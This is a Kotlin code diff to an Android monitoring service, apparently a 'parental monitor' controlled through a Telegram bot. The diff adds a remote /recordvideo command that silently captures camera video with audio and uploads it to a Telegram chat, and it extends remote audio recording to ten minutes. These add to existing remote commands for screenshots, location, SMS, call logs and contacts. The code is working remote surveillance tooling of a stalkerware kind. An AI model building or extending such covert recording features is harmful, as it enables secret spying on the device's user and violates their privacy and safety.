@@ -59,10 +59,13 @@ class MonitoringService : Service() {
     private val recordBusy = AtomicBoolean(false)
     private val audioFlushBusy = java.util.concurrent.atomic.AtomicBoolean(false)
     private val photoFlushBusy = java.util.concurrent.atomic.AtomicBoolean(false)
+    private val videoFlushBusy = java.util.concurrent.atomic.AtomicBoolean(false)
     @Volatile
     private var activeAudioFile: File? = null
     @Volatile
     private var activePhotoFile: File? = null
+    @Volatile
+    private var activeVideoFile: File? = null
     private var ringJob: Job? = null
     private var recordJob: Job? = null
     private var smsJob: Job? = null
@@ -79,6 +82,8 @@ class MonitoringService : Service() {
     private var cameraCycleMs = 0L
     private var serviceStartAt = 0L
     private val cameraAttempt = java.util.concurrent.atomic.AtomicInteger(0)
+    private val videoAttempt = java.util.concurrent.atomic.AtomicInteger(0)
+    private var videoWatchdog: Job? = null
     private val shotBusy = AtomicBoolean(false)
     private var shotWatchdog: Job? = null
     @Volatile
@@ -123,12 +128,13 @@ class MonitoringService : Service() {
         private val SMS_NUMBER_REGEX = Regex("^\\+?[0-9]{7,15}$")
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
         private val TAG_STRIP_REGEX = Regex("</?[a-zA-Z][^>]*>")
-        private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue")
+        private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue")
         private val NO_REPLAY_COMMANDS = setOf("/smsconfirm")
         private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val NOTIFICATION_ID = 1
         private const val MAX_AUDIO_KEPT = 5
+        private const val MAX_VIDEO_KEPT = 3
         private val storageWarnAt = java.util.concurrent.atomic.AtomicLong(0L)
         private val smsReqSeq = java.util.concurrent.atomic.AtomicInteger((System.currentTimeMillis() and 0xfffffff).toInt())
         private val authReminderAt = java.util.concurrent.atomic.AtomicLong(0L)
@@ -1006,7 +1012,8 @@ class MonitoringService : Service() {
             com.redeye.parentalmonitor.network.BotCommand("lock", "Lock device screen"),
             com.redeye.parentalmonitor.network.BotCommand("ring", "Ring device aloud"),
             com.redeye.parentalmonitor.network.BotCommand("ping", "Check delay, wake: /ping [camera|location]"),
-            com.redeye.parentalmonitor.network.BotCommand("record", "Record audio 5-60 s"),
+            com.redeye.parentalmonitor.network.BotCommand("record", "Record audio 5-600 s"),
+            com.redeye.parentalmonitor.network.BotCommand("recordvideo", "Record video 5-180 s"),
             com.redeye.parentalmonitor.network.BotCommand("sms", "Send SMS: /sms number message"),
             com.redeye.parentalmonitor.network.BotCommand("smsconfirm", "Confirm pending SMS"),
             com.redeye.parentalmonitor.network.BotCommand("lastnotif", "Show last notifications"),
@@ -1431,9 +1438,9 @@ class MonitoringService : Service() {
                 }
             }
             "/record" -> {
-                val seconds = arg.toIntOrNull()?.coerceIn(5, 60)
-                if (seconds == null) {
-                    sendToTelegram("Usage: /record \u003c5-60\u003e (seconds)")
+                val seconds = arg.toIntOrNull()
+                if (seconds == null || seconds !in 5..600) {
+                    sendToTelegram("Usage: /record \u003c5-600\u003e (seconds)")
                 } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                     sendToTelegram("\u26A0\uFE0F Microphone permission missing. Open Setup and grant Microphone permission.")
                 } else if (ringBusy.get()) {
@@ -1449,6 +1456,23 @@ class MonitoringService : Service() {
                             recordBusy.set(false)
                         }
                     }
+                }
+            }
+            "/recordvideo" -> {
+                val seconds = arg.toIntOrNull()
+                if (seconds == null || seconds !in 5..180) {
+                    sendToTelegram("Usage: /recordvideo \u003c5-180\u003e (seconds)")
+                } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    sendToTelegram("\u26A0\uFE0F Microphone permission missing. Open Setup and grant Microphone permission.")
+                } else if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
+                    sendToTelegram("\u26A0\uFE0F Camera permission missing. Open Setup and grant Camera permission.")
+                } else if (ringBusy.get()) {
+                    sendToTelegram("\u23F1\uFE0F Already ringing, please wait.")
+                } else if (!recordBusy.compareAndSet(false, true)) {
+                    sendToTelegram("\u23F1\uFE0F Already recording, please wait.")
+                } else {
+                    sendToTelegram("\uD83C\uDFA5 Recording video $seconds s\u2026")
+                    recordAndSendVideo(seconds)
                 }
             }
             "/sms" -> {
@@ -1657,7 +1681,8 @@ class MonitoringService : Service() {
                         appendLine("/lock - lock device screen")
                         appendLine("/ring [5-60] - ring device aloud")
                         appendLine("/ping [camera|location] - check delay + wake target")
-                        appendLine("/record \u003c5-60\u003e - record audio seconds")
+                        appendLine("/record \u003c5-600\u003e - record audio seconds")
+                        appendLine("/recordvideo \u003c5-180\u003e - record video seconds")
                         appendLine("/sms \u003cnumber\u003e \u003cmessage\u003e - send SMS")
                         appendLine("/smsconfirm - send the confirmed SMS")
                         appendLine("/lastnotif - show last notifications")
@@ -2583,6 +2608,7 @@ class MonitoringService : Service() {
         } catch (_: Exception) {
         }
         watchdogJob?.cancel()
+        videoWatchdog?.cancel()
         cameraBusy.set(false)
         smsBusy.set(false)
         ringBusy.set(false)
@@ -3472,6 +3498,219 @@ class MonitoringService : Service() {
             throw e
         } catch (e: Exception) {
             return MediaSendOutcome.KEPT
+        }
+    }
+
+    private fun recordAndSendVideo(seconds: Int) {
+        if (NetworkUtils.isAuthBlocked(preferencesManager)) {
+            recordBusy.set(false)
+            serviceScope.launch {
+                sendToTelegram("Auth rejected, video delayed until the token is fixed in Setup.")
+            }
+            return
+        }
+        ensureForegroundTypes()
+        if (!hasCameraPermission()) {
+            recordBusy.set(false)
+            serviceScope.launch {
+                sendToTelegram("⚠️ Camera permission missing. Open Setup and grant Camera permission.")
+            }
+            return
+        }
+        val attempt = videoAttempt.incrementAndGet()
+        videoWatchdog?.cancel()
+        val wd = serviceScope.launch {
+            delay(seconds * 1000L + 120_000L)
+            if (videoAttempt.get() == attempt && recordBusy.compareAndSet(true, false)) {
+                videoAttempt.incrementAndGet()
+                try { cameraService.forceReset() } catch (_: Exception) { }
+                android.util.Log.w("MonitoringService", "Video watchdog: recording did not finish, flag reset")
+                sendToTelegram("⚠️ Video recording timed out without a response. Please try /recordvideo again.")
+            }
+        }
+        videoWatchdog = wd
+        try {
+            cameraService.captureVideo(
+                durationMs = seconds * 1000L,
+                lensFacing = selectedLensFacing(),
+                onVideoTaken = { videoFile ->
+                    if (videoAttempt.get() != attempt) {
+                        try { videoFile.delete() } catch (_: Exception) { }
+                        return@captureVideo
+                    }
+                    videoAttempt.incrementAndGet()
+                    try { wd.cancel() } catch (_: Exception) { }
+                    activeVideoFile = videoFile
+                    serviceScope.launch {
+                        try {
+                            if (videoFile.length() > 48L * 1024L * 1024L) {
+                                deleteQuietly(videoFile)
+                                sendToTelegram("⚠️ Video too large (>48 MB). Try /recordvideo with fewer seconds.")
+                            } else {
+                                when (sendVideoFile(videoFile)) {
+                                    MediaSendOutcome.SENT -> {
+                                        sendToTelegram("🎥 Video sent (${seconds}s).")
+                                        flushPendingVideos()
+                                    }
+                                    MediaSendOutcome.DROPPED -> {
+                                        try { flushPendingVideos() } catch (_: Exception) { }
+                                        sendToTelegram("⚠️ Video rejected by Telegram (400), file discarded.")
+                                    }
+                                    MediaSendOutcome.KEPT -> {
+                                        try { flushPendingVideos() } catch (_: Exception) { }
+                                        sendToTelegram("⚠️ Video recorded but send failed. File kept for automatic retry.")
+                                    }
+                                }
+                            }
+                        } finally {
+                            activeVideoFile = null
+                            recordBusy.set(false)
+                        }
+                    }
+                },
+                onError = { e ->
+                    if (videoAttempt.get() != attempt) return@captureVideo
+                    videoAttempt.incrementAndGet()
+                    try { wd.cancel() } catch (_: Exception) { }
+                    recordBusy.set(false)
+                    serviceScope.launch {
+                        sendToTelegram("⚠️ Video record failed: " + sanitizedCameraError(e.message))
+                    }
+                },
+                timeoutMs = seconds * 1000L + 60_000L
+            )
+        } catch (e: Exception) {
+            videoAttempt.incrementAndGet()
+            try { wd.cancel() } catch (_: Exception) { }
+            recordBusy.set(false)
+            android.util.Log.e("MonitoringService", "✗ Error in recordAndSendVideo: ${redactToken(e.message)}")
+            serviceScope.launch {
+                sendToTelegram("⚠️ Video record failed.")
+            }
+        }
+    }
+
+    private suspend fun sendVideoFile(videoFile: File): MediaSendOutcome {
+        try {
+            if (NetworkUtils.isAuthBlocked(preferencesManager)) return MediaSendOutcome.KEPT
+            if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) return MediaSendOutcome.KEPT
+            if (!hasNetwork()) {
+                android.util.Log.w("MonitoringService", "No network - video saved for later")
+                return MediaSendOutcome.KEPT
+            }
+            val (botToken, chatId) = sendCreds()
+            if (botToken.isEmpty() || chatId.isEmpty()) {
+                android.util.Log.e("MonitoringService", "Bot credentials missing")
+                return MediaSendOutcome.KEPT
+            }
+            val requestFile = videoFile.asRequestBody("video/mp4".toMediaTypeOrNull())
+            val videoPart = MultipartBody.Part.createFormData("video", videoFile.name, requestFile)
+            val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())
+            val caption = ("🎥 " + TimeFmt.full(System.currentTimeMillis())).toRequestBody("text/plain".toMediaTypeOrNull())
+            val url = "https://api.telegram.org/bot$botToken/sendVideo"
+            val response = TelegramMediaClient.api.sendVideo(url, chatIdBody, caption, videoPart)
+            if (response.isSuccessful && response.body()?.ok == true) {
+                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "✓ Video sent successfully!")
+                deleteQuietly(videoFile)
+                return MediaSendOutcome.SENT
+            }
+            val errorBody = try {
+                response.errorBody()?.string()?.take(200) ?: ""
+            } catch (e: Exception) {
+                ""
+            }
+            if (response.code() == 429) {
+                val waitSecs = NetworkUtils.parseRetryAfter(errorBody).coerceIn(1L, 300L)
+                mediaBackoffUntil = android.os.SystemClock.elapsedRealtime() + waitSecs * 1000L
+                android.util.Log.w("MonitoringService", "Video rate limited, backing off ${waitSecs}s without blocking")
+                try {
+                    MessageScheduler.scheduleMessageSendNext(this, waitSecs * 1000L)
+                } catch (_: Exception) {
+                }
+                return MediaSendOutcome.KEPT
+            }
+            if (response.code() == 401 || response.code() == 403) {
+                try {
+                    preferencesManager.credentialError = response.code().toString()
+                    preferencesManager.credentialErrorAt = System.currentTimeMillis()
+                } catch (_: Exception) {
+                }
+            } else if (response.code() == 400) {
+                if (NetworkUtils.isChatMissing(errorBody)) {
+                    try {
+                        preferencesManager.credentialError = response.code().toString()
+                        preferencesManager.credentialErrorAt = System.currentTimeMillis()
+                    } catch (_: Exception) {
+                    }
+                    return MediaSendOutcome.KEPT
+                }
+                if (NetworkUtils.isRightsLimited(errorBody)) {
+                    android.util.Log.w("MonitoringService", "Video rights limited (400), keeping file without auth block")
+                    return MediaSendOutcome.KEPT
+                }
+                android.util.Log.w("MonitoringService", "Video rejected (400), dropping file")
+                deleteQuietly(videoFile)
+                return MediaSendOutcome.DROPPED
+            }
+            return MediaSendOutcome.KEPT
+        } catch (e: kotlinx.coroutines.CancellationException) {
+            throw e
+        } catch (e: Exception) {
+            android.util.Log.e("MonitoringService", "✗ Error sending video to Telegram: ${redactToken(e.message)}")
+            return MediaSendOutcome.KEPT
+        }
+    }
+
+    private suspend fun flushPendingVideos(max: Int = 3) {
+        if (NetworkUtils.isAuthBlocked(preferencesManager)) return
+        if (android.os.SystemClock.elapsedRealtime() < mediaBackoffUntil) return
+        if (!videoFlushBusy.compareAndSet(false, true)) return
+        try {
+            if (!hasNetwork()) return
+            val pending = try {
+                cacheDir.listFiles { file ->
+                    file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4")
+                }?.sortedBy { it.lastModified() }?.take(max) ?: return
+            } catch (e: Exception) {
+                return
+            }
+            val now = System.currentTimeMillis()
+            var droppedVideos = 0
+            for (file in pending) {
+                if (file == activeVideoFile) continue
+                if (now - file.lastModified() < 10_000L) continue
+                val videoOutcome = sendVideoFile(file)
+                if (videoOutcome == MediaSendOutcome.KEPT) break
+                if (videoOutcome == MediaSendOutcome.DROPPED) droppedVideos++
+                kotlinx.coroutines.delay(500)
+            }
+            if (droppedVideos > 0) {
+                try {
+                    messageQueue.addMessage("⚠️ $droppedVideos video file(s) rejected by Telegram (400), discarded.", true)
+                    MessageScheduler.scheduleMessageSend(this)
+                } catch (_: Exception) {
+                }
+            }
+        } finally {
+            videoFlushBusy.set(false)
+            pruneVideoCache(MAX_VIDEO_KEPT)
+        }
+    }
+
+    private fun pruneVideoCache(maxKept: Int) {
+        try {
+            val files = cacheDir.listFiles { file ->
+                file.isFile && file.name.startsWith("video_") && file.name.endsWith(".mp4")
+            }?.sortedBy { it.lastModified() }?.filter { it != activeVideoFile } ?: return
+            val dropped = files.dropLast(maxKept)
+            if (dropped.isEmpty()) return
+            dropped.forEach { deleteQuietly(it) }
+            try {
+                messageQueue.addMessage("⚠️ ${dropped.size} video file(s) dropped (cache full).", true)
+                MessageScheduler.scheduleMessageSend(this)
+            } catch (_: Exception) {
+            }
+        } catch (_: Exception) {
         }
     }
 
